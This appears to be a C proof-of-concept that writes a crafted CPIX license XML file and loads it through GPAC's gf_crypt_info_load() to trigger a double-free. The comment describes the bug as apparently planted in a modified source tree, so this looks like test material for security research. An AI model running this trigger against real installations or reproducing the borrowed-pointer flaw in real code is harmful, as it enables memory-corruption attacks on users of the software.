/* PoC: double-free while loading a CPIX DRM license file through the
 * public gf_crypt_info_load() API (used by MP4Box -crypt/-decrypt and
 * gf_crypt_file()/gf_decrypt_file()).
 *
 * A ContentKeyUsageRule/LabelFilter/Label text value is fetched with
 * crypt_xml_get_text() and freed by the caller; on the modified tree
 * crypt_xml_get_text() returns a borrowed pointer into the live XML DOM
 * tree instead of a freshly allocated copy, so that free() races with
 * the DOM teardown's own free of the same node name.
 */
#include <gpac/crypt_tools.h>
#include <gpac/tools.h>
#include <stdio.h>

static const char *cpix_xml =
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
"<CPIX xmlns=\"urn:dashif:org:cpix\">\n"
"  <ContentKeyList>\n"
"    <ContentKey kid=\"11111111-1111-1111-1111-111111111111\" commonEncryptionScheme=\"cenc\" explicitIV=\"AAAAAAAAAAAAAAAAAAAAAA==\">\n"
"      <Data>\n"
"        <PlainValue>AAAAAAAAAAAAAAAAAAAAAA==</PlainValue>\n"
"      </Data>\n"
"    </ContentKey>\n"
"  </ContentKeyList>\n"
"  <ContentKeyUsageRuleList>\n"
"    <ContentKeyUsageRule kid=\"11111111-1111-1111-1111-111111111111\">\n"
"      <LabelFilter>\n"
"        <Label>HD</Label>\n"
"      </LabelFilter>\n"
"    </ContentKeyUsageRule>\n"
"  </ContentKeyUsageRuleList>\n"
"</CPIX>\n";

int main(void)
{
	const char *path = "probe_cpix.xml";
	FILE *f = fopen(path, "wb");
	GF_CryptInfo *info;
	GF_Err e = GF_OK;

	if (!f) return 1;
	fwrite(cpix_xml, 1, strlen(cpix_xml), f);
	fclose(f);

	info = gf_crypt_info_load(path, &e);
	if (info) gf_crypt_info_del(info);

	fprintf(stdout, "gf_crypt_info_load returned err=%d\n", e);
	return 0;
}
